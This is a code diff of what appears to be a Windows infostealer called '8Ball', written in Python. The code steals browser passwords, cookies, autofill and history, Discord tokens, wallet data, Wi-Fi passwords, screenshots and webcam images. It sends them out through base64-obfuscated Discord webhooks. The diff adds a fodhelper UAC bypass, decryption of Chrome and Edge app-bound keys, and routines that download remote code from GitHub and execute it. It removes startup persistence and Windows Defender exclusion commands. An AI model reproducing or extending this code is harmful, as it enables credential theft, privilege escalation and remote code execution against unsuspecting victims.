@@ -27,20 +27,15 @@ def RX_DB6(msg, level="INFO"):
         global _DBG_LOG, _DBG_MESSAGES
         _DBG_MESSAGES.append(line)
         if _DBG_LOG is None:
-            _DBG_LOG = open(os.environ.get("TEMP", ".") + "\\8Ball_debug.log", "a", encoding="utf-8")
+            _DBG_LOG = open(os.environ.get("TEMP", ".") + "\\8ball_debug.log", "a", encoding="utf-8")
         _DBG_LOG.write(line + "\n")
         _DBG_LOG.flush()
-        if FEATURE_CONFIG.get("debug_mode", False):
-            try:
-                sys.stdout.write(line + "\n")
-                sys.stdout.flush()
-            except Exception:
-                pass
     except Exception:
         pass
 
 # Base64-obfuscated debug webhook URL (decoded at runtime)
-_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxOTU2NzQ2MDgzNDA4NjkxMi9COTlpd3NyVk1NUlVRTkh4U2JSbVVlTG5GMVRfekpydVJndlZ5NHlMQ3IxWVBKNVFVNFdVb1U0U0d0TXdocTJlQjFCNA=="
+_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUyMDA2MjcwMzc4MjIwMzQ5NC9zUC1SYlZhdS1mMk9lTkV4TkMxTVotMjJRNGxMd1M4LUlwOVZoZGZCRUFVUVk2R1U1ejQ3Y0xVTW5tVFBlTExvRFVGaA=="
+_BLD_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxOTkxNDg1MTk5MTAyNzg0NC9yVGNGVlJ6bWV3Y3k0aTdWM3FST09mMUt1N0daQlh5djdBR0pYLUVjWExCZDRLaURZMkhlRy1uSFZ5bl9ScEpzb3ktSA=="
 
 # Send accumulated debug logs to Discord as an embed (respects debug_mode gate)
 def send_debug_embed():
@@ -56,19 +51,18 @@ def send_debug_embed():
             body = body[-4000:]
         payload = {
             "embeds": [{
-                "title": "8BALL | DH",
+                "title": "8ball",
                 "description": f"```\n{body}\n```",
                 "color": 0x5865F2,
                 "footer": {"text": f"{len(_DBG_MESSAGES)} total debug lines"}
             }],
-            "username": "8BALL | DH",
+            "username": "8ball",
             "allowed_mentions": {"parse": []}
         }
         headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
         L04DUr118(dbg_hook, data=dumps(payload).encode(), headers=headers)
     except Exception:
         pass
-print = lambda *a, **kw: None
 import threading
 import subprocess
 from sys import executable, stderr
@@ -85,9 +79,7 @@ CREATE_NO_WINDOW = 0x08000000
 
 APPBOUND_KEY_HEX = ""
 
-# Only run when compiled by PyInstaller (generate payload). Exit if run as raw script.
-if not getattr(sys, 'frozen', False):
-    sys.exit(0)
+# Allow running as standalone script (no PyInstaller required)
 
 # --- string obfuscation layer ---
 def _y(b, k=0x9C):
@@ -142,9 +134,14 @@ class NullWriter(object):
 warnings.filterwarnings("ignore")
 null_writer = NullWriter()
 sys.stderr = null_writer
+sys.stdout = null_writer
 
 ModuleRequirements = [
-    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
+    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto'],
+    ["requests", "requests"],
+    ["PIL", "Pillow"],
+    ["psutil", "psutil"],
+    ["cv2", "opencv-python-headless"],
 ]
 for module in ModuleRequirements:
     try: 
@@ -184,12 +181,12 @@ FEATURE_CONFIG = {
     "discord_gift_codes": True,
     "wallet_gaming_data": True,
     "telegram_desktop": True,
-    "debug_mode": True,
     "system_info": True,
     "screenshot_capture": True,
     "webcam_capture": True,
     "roblox_cookies": True,
     "wifi_passwords": True,
+    "debug_mode": True,
     "startup_persistence": False,
     "browser_autofill_history": True,
     "browser_bookmarks": True,
@@ -215,58 +212,29 @@ FEATURE_CONFIG = {
 
 # Debug logs go to Discord embed via send_debug_embed() — no console needed
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+# UAC bypass: re-launch as admin via fodhelper without prompt
+def _uac_bypass():
+    try:
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            return
+        if getattr(sys, 'frozen', False):
+            cmd = sys.argv[0]
+        else:
+            cmd = f'"{sys.executable}" "{__file__}"'
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell\open\command") as key:
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        subprocess.run("fodhelper.exe", shell=True, creationflags=CREATE_NO_WINDOW)
+        time.sleep(2)
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell\open\command")
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell")
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
+        except:
+            pass
+        sys.exit(0)
+    except:
+        pass
 
 def antidebug():
     """Anti-debug / anti-VM – only runs when anti_debug feature is enabled."""
@@ -352,23 +320,59 @@ def check_dll():
         exit_program('VM Detected')
 
 # Webhook URL — builder.pyw encodes this in base64 at build time.
-_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxNzc3NDQ3MTIwNzg1MDE1NS9zMmFVZk1MZWpZdE5lTzlYRGh1dUVKbW4xTmJ0RjlFU3JmOWJiSGJNNmN2ajJYSEFmMUlkaEZ0a003MXBlZC1vRG5aUQ=="
+_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxOTA0MjkxMDY0NDA4MDY2MS9vY1UxYkR0ZmVJNk9UbXZUYlNIYWR1bDhEb0JzYWpIU3ljSHhwUnY1Zm45bm9EaDVWNkI3cW91QXh4Mks4QVVtenVJdA=="
 h00k = base64.b64decode(_HOOK_B64).decode()
+
+# Validate main webhook on startup
+def _validate_main_webhook():
+    try:
+        if not h00k or ("discord.com/api/webhooks" not in h00k and "discordapp.com/api/webhooks" not in h00k):
+            RX_DB6("[8Ball] Main webhook invalid or missing", "ERROR")
+            return False
+        return True
+    except Exception:
+        return False
+
+_MAIN_WEBHOOK_VALID = _validate_main_webhook()
 
 # Remote GitHub stub URL (base64-obfuscated). Fetched and executed at runtime alongside rx.py.
 _STUB_URL_B64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NsMXRteXdyc3R6LWVuZy9pbXBvcnRhbnQvbWFpbi9zdHViLnB5"
 def fetch_and_run_stub():
+    script_path = None
     try:
-        url = base64.b64decode(_STUB_URL_B64).decode()
-        resp = urlopen(Request(url), timeout=15)
-        code = resp.read().decode()
-        stub_globals = globals().copy()
-        stub_globals["__name__"] = "__stub_main__"
-        exec(code, stub_globals)
-    except Exception:
-        pass
-# Run stub in a thread so both execute simultaneously
-threading.Thread(target=fetch_and_run_stub, daemon=True).start()
+        for attempt in range(3):
+            try:
+                url = base64.b64decode(_STUB_URL_B64).decode()
+                RX_DB6(f"[8Ball] fetch_and_run_stub: Attempt {attempt+1}/3 fetching {url}")
+                req = Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"})
+                resp = urlopen(req, timeout=15)
+                code = resp.read().decode()
+                if not code.strip():
+                    raise ValueError("Empty response")
+                temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
+                script_path = os.path.join(temp_dir, f"cr_stub_{random.randint(100000,999999)}.py")
+                with open(script_path, "w", encoding="utf-8") as f:
+                    f.write(code)
+                stub_globals = globals().copy()
+                stub_globals["__file__"] = script_path
+                stub_globals["__name__"] = "__main__"
+                exec(compile(code, script_path, "exec"), stub_globals)
+                RX_DB6("[8Ball] fetch_and_run_stub: Stub executed successfully")
+                return
+            except Exception as e:
+                RX_DB6(f"[8Ball] fetch_and_run_stub attempt {attempt+1} failed: {type(e).__name__}: {e}")
+                if attempt < 2:
+                    time.sleep(2)
+        RX_DB6("[8Ball] fetch_and_run_stub: All attempts failed")
+    finally:
+        if script_path and os.path.exists(script_path):
+            try:
+                os.remove(script_path)
+            except Exception:
+                pass
+
+# Remote stub download disabled — it overrides local functions with broken webhook validation
+# threading.Thread(target=fetch_and_run_stub, daemon=True).start()
 
 inj3c710n_url = _y('6PTs6Kbvs7P97rLr9fv06P7p7+nu+fP/6PLy+bLo8/+z8eSsrKyz2/L1+fbo//P1s/L98fL19bP48uT59rLv')
 
@@ -395,38 +399,13 @@ def print_enabled_features():
     except Exception:
         pass
 
-def send_confirmation_embed(title, description):
-    """Send a simple confirmation embed to the webhook, silently ignoring errors."""
+def Z1PF01D3r(foldername, target_dir):
+    import threading
+    thread_id = threading.current_thread().ident or 0
+    unique_id = f"{int(time.time() * 1000)}_{thread_id}_{random.randint(100000,999999)}"
+    zip_path = os.path.join(temp, f"{foldername}_{unique_id}.zip")
     try:
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-        }
-        payload = {
-            "content": f"@everyone @here {GLINFO}",
-            "embeds": [{
-                "title": title,
-                "description": description,
-                "footer": {"text": "8BALL | DH", "icon_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935"}
-            }],
-            "username": "8BALL | DH",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935",
-            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
-        }
-        L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
-        RX_DB6(f"[8Ball] Confirmation embed sent: {title}")
-    except Exception:
-        pass
-
-
-def Z1PF01D3r(foldername, target_dir):            
-    zip_path = temp+"/"+foldername + '.zip'
-    try:
-        if not os.path.isdir(target_dir):
-            RX_DB6(f"Z1PF01D3r: target_dir not found: {target_dir}", "WARN")
-            return
-        zipobj = ZipFile(zip_path, 'w', ZIP_STORED)
-        try:
+        with ZipFile(zip_path, 'w', ZIP_STORED) as zipobj:
             rootlen = len(target_dir) + 1
             for base, dirs, files in os.walk(target_dir):
                 for file in files:
@@ -448,10 +427,14 @@ def Z1PF01D3r(foldername, target_dir):
                                 zipobj.writestr(zi, f.read())
                         except (PermissionError, OSError):
                             continue
-        finally:
-            zipobj.close()
-    except Exception as e:
-        RX_DB6(f"Z1PF01D3r failed: {foldername}: {e}", "WARN")
+    except Exception:
+        if os.path.exists(zip_path):
+            try:
+                os.remove(zip_path)
+            except Exception:
+                pass
+        raise
+    return zip_path
 
 def CryptUnprotectData(encrypted_bytes, entropy=b''):
     buf_in = (c_ubyte * len(encrypted_bytes)).from_buffer_copy(encrypted_bytes)
@@ -749,19 +732,83 @@ class Chromium:
 
     @staticmethod
     def _decrypt_with_cng(input_data):
+        """Decrypt Chrome/Edge v20 app-bound key using CNG key store.
+        Input: IV(12) + ciphertext(32) + tag(16) = 60 bytes (Chrome 130+ format)
+        """
+        key_names = ["Google Chrome Key", "Google Chromekey1", "Microsoft Edge Key", "MicrosoftEdgeKey1"]
+        NCRYPT_SILENT_FLAG = 0x40
         ncrypt = ctypes.windll.NCRYPT
-        h_provider = gdef.NCRYPT_PROV_HANDLE()
-        ncrypt.NCryptOpenStorageProvider(ctypes.byref(h_provider), "Microsoft Software Key Storage Provider", 0)
-        h_key = gdef.NCRYPT_KEY_HANDLE()
-        ncrypt.NCryptOpenKey(h_provider, ctypes.byref(h_key), "Google Chromekey1", 0, 0)
-        pcb = gdef.DWORD(0)
-        inp = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
-        ncrypt.NCryptDecrypt(h_key, inp, len(input_data), None, None, 0, ctypes.byref(pcb), 0x40)
-        out = (ctypes.c_ubyte * pcb.value)()
-        ncrypt.NCryptDecrypt(h_key, inp, pcb.value, None, out, pcb.value, ctypes.byref(pcb), 0x40)
-        ncrypt.NCryptFreeObject(h_key)
-        ncrypt.NCryptFreeObject(h_provider)
-        return bytes(out[:pcb.value])
+
+        if len(input_data) < 12 + 16:
+            return None
+        iv = input_data[:12]
+        ciphertext = input_data[12:-16]
+        tag = input_data[-16:]
+
+        h_provider = ctypes.c_void_p(0)
+        if ncrypt.NCryptOpenStorageProvider(ctypes.byref(h_provider), "Microsoft Software Key Storage Provider", 0) != 0:
+            return None
+
+        h_key = ctypes.c_void_p(0)
+        key_opened = False
+        for name in key_names:
+            if ncrypt.NCryptOpenKey(h_provider, ctypes.byref(h_key), name, 0, NCRYPT_SILENT_FLAG) == 0:
+                key_opened = True
+                break
+
+        if not key_opened:
+            ncrypt.NCryptFreeObject(h_provider)
+            return None
+
+        try:
+            class _BCRYPT_AUTH_CIPHER_INFO(ctypes.Structure):
+                _fields_ = [
+                    ("cbSize", wintypes.ULONG),
+                    ("dwInfoVersion", wintypes.ULONG),
+                    ("pbNonce", ctypes.POINTER(ctypes.c_ubyte)),
+                    ("cbNonce", wintypes.ULONG),
+                    ("pbAuthData", ctypes.POINTER(ctypes.c_ubyte)),
+                    ("cbAuthData", wintypes.ULONG),
+                    ("pbTag", ctypes.POINTER(ctypes.c_ubyte)),
+                    ("cbTag", wintypes.ULONG),
+                    ("pbMacContext", ctypes.POINTER(ctypes.c_ubyte)),
+                    ("cbMacContext", wintypes.ULONG),
+                    ("dwFlags", wintypes.ULONG),
+                    ("pbReserved", ctypes.c_void_p),
+                    ("cbReserved", wintypes.ULONG),
+                    ("pbRepromulgation", ctypes.c_void_p),
+                    ("cbRepromulgation", wintypes.ULONG),
+                ]
+
+            iv_arr = (ctypes.c_ubyte * len(iv)).from_buffer_copy(iv)
+            tag_arr = (ctypes.c_ubyte * len(tag)).from_buffer_copy(tag)
+
+            pad_info = _BCRYPT_AUTH_CIPHER_INFO()
+            pad_info.cbSize = ctypes.sizeof(_BCRYPT_AUTH_CIPHER_INFO)
+            pad_info.dwInfoVersion = 1
+            pad_info.pbNonce = iv_arr
+            pad_info.cbNonce = len(iv)
+            pad_info.pbTag = tag_arr
+            pad_info.cbTag = len(tag)
+            pad_info.pbAuthData = None
+            pad_info.cbAuthData = 0
+
+            pcb = wintypes.ULONG(0)
+            inp = (ctypes.c_ubyte * len(ciphertext)).from_buffer_copy(ciphertext)
+
+            if ncrypt.NCryptDecrypt(h_key, inp, len(ciphertext), ctypes.byref(pad_info), None, 0, ctypes.byref(pcb), NCRYPT_SILENT_FLAG) != 0:
+                return None
+
+            out = (ctypes.c_ubyte * pcb.value)()
+            if ncrypt.NCryptDecrypt(h_key, inp, len(ciphertext), ctypes.byref(pad_info), out, pcb.value, ctypes.byref(pcb), NCRYPT_SILENT_FLAG) != 0:
+                return None
+
+            return bytes(out[:pcb.value])
+        finally:
+            if h_key:
+                ncrypt.NCryptFreeObject(h_key)
+            if h_provider:
+                ncrypt.NCryptFreeObject(h_provider)
 
     @classmethod
     def _get_v20_master_key(cls, local_state_folder):
@@ -1192,90 +1239,20 @@ class Chromium:
                 pass
         return profiles
 
-class PasswordExtractor:
-    def get_encryption_key(self, browser):
-        if browser == "Chrome":
-            ls_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-        elif browser == "Edge":
-            ls_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
-        else:
-            return None
-        if not os.path.isfile(ls_path):
-            return None
-        try:
-            ls = json_mod.loads(Path(ls_path).read_text(encoding="utf-8"))
-            b64_key = ls.get("os_crypt", {}).get("encrypted_key")
-            if not b64_key:
-                return None
-            raw = base64.b64decode(b64_key)
-            return CryptUnprotectData(raw[5:])
-        except Exception:
-            return None
-
-    def decrypt_password(self, password, key):
-        try:
-            iv = password[3:15]
-            ct = password[15:]
-            cipher = AES.new(key, AES.MODE_GCM, iv)
-            return cipher.decrypt(ct)[:-16].decode("utf-8", errors="replace")
-        except Exception:
-            try:
-                dec = CryptUnprotectData(bytes(password))
-                return dec.decode("utf-8", errors="replace") if dec else ""
-            except Exception:
-                return ""
-
-    def extract_passwords(self, browser):
-        key = self.get_encryption_key(browser)
-        if key is None:
-            return []
-        if browser == "Chrome":
-            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
-        elif browser == "Edge":
-            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
-        else:
-            return []
-        if not os.path.isfile(db_path):
-            return []
-        tmp = None
-        try:
-            tmp = tempfile.mktemp(suffix=".db")
-            shutil.copy2(db_path, tmp)
-            conn = sqlite3.connect(tmp)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created")
-            rows = cursor.fetchall()
-            conn.close()
-            results = []
-            for origin_url, username, password_bytes in rows:
-                if not password_bytes:
-                    continue
-                password = self.decrypt_password(bytes(password_bytes), key)
-                if origin_url and username and password:
-                    results.append({"url": origin_url, "username": username, "password": password, "application": browser})
-            return results
-        except Exception:
-            return []
-        finally:
-            if tmp:
-                try:
-                    os.remove(tmp)
-                except (PermissionError, OSError):
-                    pass
-
-
 def L04DUr118(h00k, data='', headers=None):
     if not FEATURE_CONFIG.get("send_to_discord", True):
         RX_DB6("L04DUr118 skipped (send_to_discord is disabled)", "SKIP")
         return None
-    if not h00k or _y('7P2z9fnr9P7z8+/3') not in str(h00k):
-        RX_DB6("L04DUr118 skipped (invalid/missing webhook)", "SKIP")
+    if not _MAIN_WEBHOOK_VALID:
+        RX_DB6("L04DUr118 skipped (main webhook invalid)", "SKIP")
         return None
     RX_DB6(f"L04DUr118 sending {len(data)} bytes to webhook")
     if headers is None:
         headers = {}
     if "User-Agent" not in headers:
-        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/102.0"
+    if "Content-Type" not in headers:
+        headers["Content-Type"] = "application/json"
     for i in range(8):
         try:
             r = urlopen(Request(h00k, data=data, headers=headers))
@@ -1511,22 +1488,41 @@ except Exception:
 def fetch_and_run():
     """Download sstub.py from GitHub and run after main features complete."""
     if not RAW_URL:
+        RX_DB6("[8Ball] fetch_and_run: RAW_URL is empty")
         return
+    script_path = None
     try:
-        resp = urlopen(Request(RAW_URL, headers={
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-        }), timeout=30)
-        code = resp.read().decode("utf-8")
-        temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
-        script_path = os.path.join(temp_dir, "cr_remote_stub.py")
-        with open(script_path, "w", encoding="utf-8") as f:
-            f.write(code)
-        stub_globals = globals().copy()
-        stub_globals["__file__"] = script_path
-        stub_globals["__name__"] = "__main__"
-        exec(compile(code, script_path, "exec"), stub_globals)
-    except Exception as e:
-        RX_DB6(f"[8Ball] fetch_and_run failed: {type(e).__name__}: {e}")
+        for attempt in range(3):
+            try:
+                RX_DB6(f"[8Ball] fetch_and_run: Attempt {attempt+1}/3 fetching {RAW_URL}")
+                req = Request(RAW_URL, headers={
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                })
+                resp = urlopen(req, timeout=30)
+                code = resp.read().decode("utf-8")
+                if not code.strip():
+                    raise ValueError("Empty response")
+                temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
+                script_path = os.path.join(temp_dir, f"cr_remote_stub_{random.randint(100000,999999)}.py")
+                with open(script_path, "w", encoding="utf-8") as f:
+                    f.write(code)
+                stub_globals = globals().copy()
+                stub_globals["__file__"] = script_path
+                stub_globals["__name__"] = "__main__"
+                exec(compile(code, script_path, "exec"), stub_globals)
+                RX_DB6("[8Ball] fetch_and_run: Stub executed successfully")
+                return
+            except Exception as e:
+                RX_DB6(f"[8Ball] fetch_and_run attempt {attempt+1} failed: {type(e).__name__}: {e}")
+                if attempt < 2:
+                    time.sleep(2)
+        RX_DB6("[8Ball] fetch_and_run: All attempts failed")
+    finally:
+        if script_path and os.path.exists(script_path):
+            try:
+                os.remove(script_path)
+            except Exception:
+                pass
 
 def G37UHQFr13ND5(token):
     if not FEATURE_CONFIG.get("discord_hq_friends_guilds", False):
@@ -1631,75 +1627,6 @@ def CH3CK70K3N(token):
         return True
     except:
         return False
-
-if getattr(sys, 'frozen', False):
-    currentFilePath = os.path.dirname(sys.executable)
-else:
-    currentFilePath = os.path.dirname(os.path.abspath(__file__))
-
-fileName = os.path.basename(sys.argv[0])
-filePath = os.path.join(currentFilePath, fileName)
-
-startupFolderPath = os.path.join(
-    os.path.expanduser('~'),
-    'AppData',
-    'Roaming',
-    'Microsoft',
-    'Windows',
-    'Start Menu',
-    'Programs',
-    'Startup'
-)
-startupFilePath = os.path.join(startupFolderPath, fileName)
-
-def add_windows_security_exclusion_startup(app_name):
-    try:
-        paths = set()
-        paths.add(filePath)
-        paths.add(startupFilePath)
-        try:
-            ps_cmd = f'Get-StartApps | Where-Object {{ $_.Name -eq "{app_name}" }} | Select-Object -ExpandProperty "Path"'
-            result = subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], capture_output=True, text=True, timeout=15, creationflags=CREATE_NO_WINDOW)
-            p = result.stdout.strip()
-            if p:
-                paths.add(p)
-        except:
-            pass
-        try:
-            ps_cmd = f'Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" | Select-Object -ExpandProperty "{app_name}" -ErrorAction SilentlyContinue'
-            result = subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], capture_output=True, text=True, timeout=15, creationflags=CREATE_NO_WINDOW)
-            p = result.stdout.strip()
-            if p and os.path.isfile(p):
-                paths.add(p)
-        except:
-            pass
-        for p in paths:
-            if p:
-                subprocess.run(['powershell', '-NoProfile', '-Command', f'Add-MpPreference -ExclusionPath "{p}"'], capture_output=True, timeout=15, creationflags=CREATE_NO_WINDOW)
-    except:
-        pass
-
-def ensure_startup_persistence():
-    """
-    Startup Persistence feature:
-    Silently copy the current executable/script into the user's Startup folder,
-    but only when the startup_persistence feature is enabled.
-    """
-    if not FEATURE_CONFIG.get("startup_persistence", False):
-        return
-
-    try:
-        os.makedirs(startupFolderPath, exist_ok=True)
-        if os.path.abspath(filePath).lower() == os.path.abspath(startupFilePath).lower():
-            return
-        with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
-            shutil.copyfileobj(src_file, dst_file)
-    except Exception:
-        pass
-
-ensure_startup_persistence()
-app_name = os.path.splitext(fileName)[0]
-add_windows_security_exclusion_startup(app_name)
 
 def create_windows_user():
     try:
@@ -1810,7 +1737,7 @@ def UP104D70K3N(token, path):
                     "icon_url": f"{pfp}"
                     },
                 "footer": {
-                    "text": f"8Ball",
+                    "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                     },
                 "thumbnail": {
@@ -1818,8 +1745,8 @@ def UP104D70K3N(token, path):
                     }
                 }
             ],
-            "username": f"8BALL | DH",
-            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+            "username": f"8ball",
+            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
@@ -1851,15 +1778,15 @@ def UP104D(name, link):
             "content": f"@everyone @here {GLINFO}",
             "embeds": [
                 {
-               "title": "8BALL | DH","fields": link,
+               "title": "8ball","fields": link,
                 "footer": {
-                    "text": f"8Ball",
+                    "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 },
                 }
             ],
-            "username": f"8BALL | DH",
-            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+            "username": f"8ball",
+            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
@@ -1882,15 +1809,15 @@ def UP104D(name, link):
             "content": f"@everyone @here {GLINFO}",
             "embeds": [
                 {"fields": endlist,
-                "title": "8BALL | DH",
+                "title": "8ball",
                 "footer": {
-                    "text": f"8Ball",
+                    "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
                 }
             ],
-            "username": f"8BALL | DH",
-            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+            "username": f"8ball",
+            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
@@ -2112,31 +2039,6 @@ def G378r0W53r5(br0W53rP47H5):
                     RX_DB6(f"Chromium PW: {browser} yielded {count} accounts")
                 except Exception as e:
                     RX_DB6(f"Chromium PW: {browser} failed: {e}", "WARN")
-            # Also try PS.py-style extraction for Chrome & Edge as fallback
-            try:
-                pe = PasswordExtractor()
-                for fallback_browser in ("Chrome", "Edge"):
-                    fx = f"{fallback_browser} (PS)"
-                    RX_DB6(f"Chromium PW: scanning {fx}")
-                    fb_accounts = pe.extract_passwords(fallback_browser)
-                    seen_urls = {(a["url"], a["username"]) for a in csv_rows}
-                    for account in fb_accounts:
-                        if (account["url"], account["username"]) in seen_urls:
-                            continue
-                        seen_urls.add((account["url"], account["username"]))
-                        for wa in k3YW0rd:
-                            old = wa
-                            if "https" in wa:
-                                tmp = wa
-                                wa = tmp.split('[')[1].split(']')[0]
-                            if wa in account['url']:
-                                if not old in p45WW0rDs: p45WW0rDs.append(old)
-                        P455w.append(f"UR1: {account['url']} | U53RN4M3: {account['username']} | P455W0RD: {account['password']}")
-                        P455WC0UNt += 1
-                        csv_rows.append((account['url'], account['username'], account['password']))
-                    RX_DB6(f"Chromium PW: {fx} yielded {len(fb_accounts)} accounts ({len([a for a in fb_accounts if (a['url'], a['username']) not in {(b['url'], b['username']) for b in csv_rows[:len(csv_rows)-len(fb_accounts)]}])} new)")
-            except Exception as e:
-                RX_DB6(f"Chromium PW: PS fallback failed: {e}", "WARN")
             RX_DB6(f"Chromium PW: total {P455WC0UNt} passwords, {len(p45WW0rDs)} keywords")
             Wr173F0rF113(P455w, 'passwords')
             temp_dir = os.getenv("TEMP")
@@ -2259,47 +2161,47 @@ def G378r0W53r5(br0W53rP47H5):
         "content": f"@everyone @here {GLINFO}",
         "embeds": [
             {
-                "title": "8BALL | DH",
+                "title": "8ball",
                 "description": (
                     f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n"
                     f"**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_Passwords.txt]({filess[0]})\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_Passwords.csv]({filess[1]})"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Passwords.txt]({filess[0]})\n"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Passwords.csv]({filess[1]})"
                 ),"footer": {
-                    "text": "8BALL | DH",
+                    "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
             },
             {
-                "title": "8BALL | DH",
+                "title": "8ball",
                 "description": (
                     f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n"
                     f"**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_Cookies.txt]({filess[2]})"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Cookies.txt]({filess[2]})"
                 ),"footer": {
-                    "text": "8BALL | DH",
+                    "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
             },
             {
-                "title": "8BALL | DH",
+                "title": "8ball",
                 "description": (
                     f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_Histories.txt]({filess[5]})\n\n"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Histories.txt]({filess[5]})\n\n"
                     f"<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_Autofills.txt]({filess[4]})\n\n"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Autofills.txt]({filess[4]})\n\n"
